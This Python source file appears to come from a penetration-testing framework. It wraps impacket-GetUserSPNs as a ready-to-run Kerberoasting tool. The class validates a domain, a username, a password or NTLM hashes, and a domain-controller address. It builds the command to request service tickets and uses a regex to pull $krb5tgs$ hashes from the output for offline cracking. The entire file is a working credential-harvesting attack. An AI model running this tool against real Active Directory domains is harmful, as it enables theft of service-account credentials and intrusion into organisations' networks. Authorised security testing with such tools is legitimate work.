"""ImpacketKerberoastTool — Kerberoast attack against AD via impacket-GetUserSPNs."""
import re
from typing import Any

from astro.core.validators import SHELL_METACHARACTERS, validate_additional_args
from astro.tools.base import BaseTool

_KERBEROS_HASH_RE = re.compile(r'(\$krb5tgs\$[^\s]+)', re.MULTILINE)
_HASHES_RE = re.compile(r'^[0-9a-fA-F:]+$')


def _build_auth(domain: str, username: str, password: str = "", hashes: str = "") -> tuple[str, list[str]]:
    if hashes:
        return f"{domain}/{username}", ["-hashes", hashes]
    return f"{domain}/{username}:{password}", []


class ImpacketKerberoastTool(BaseTool):
    name = "impacket-kerberoast"
    description = "Kerberoasting attack using impacket-GetUserSPNs to extract TGS hashes"

    def validate(self, params: dict[str, Any]) -> dict[str, Any]:
        target = params.get("target", "")
        if not target:
            raise ValueError("Target parameter is required")
        if not all(c.isalnum() or c in ".-_:" for c in target):
            raise ValueError("Invalid target parameter")

        domain = params.get("domain", "")
        if not domain:
            raise ValueError("Domain parameter is required")
        if not all(c.isalnum() or c in ".-" for c in domain):
            raise ValueError("Invalid domain parameter")

        username = params.get("username", "")
        if not username:
            raise ValueError("Username parameter is required")
        if SHELL_METACHARACTERS.search(username):
            raise ValueError("Invalid username parameter")

        password = params.get("password", "")
        if password and SHELL_METACHARACTERS.search(password):
            raise ValueError("Invalid password parameter")

        hashes = params.get("hashes", "")
        if hashes and not _HASHES_RE.match(hashes):
            raise ValueError("Invalid hashes parameter: must be hex and ':' only")

        additional_args = params.get("additional_args", "")
        tokens: list[str] = []
        if additional_args:
            tokens = validate_additional_args(additional_args)

        return {
            "target": target,
            "domain": domain,
            "username": username,
            "password": password,
            "hashes": hashes,
            "tokens": tokens,
        }

    def build_command(self, params: dict[str, Any]) -> list[str]:
        auth_str, extra_flags = _build_auth(
            params["domain"], params["username"], params["password"], params["hashes"]
        )
        cmd = ["impacket-GetUserSPNs", auth_str, "-dc-ip", params["target"], "-request"]
        cmd.extend(extra_flags)
        cmd.extend(params["tokens"])
        return cmd

    def parse_output(self, raw: dict[str, Any], params: dict[str, Any]) -> dict[str, Any]:
        stdout = raw.get("stdout", "")
        hashes = _KERBEROS_HASH_RE.findall(stdout)
        return {"hashes": hashes, "count": len(hashes)}
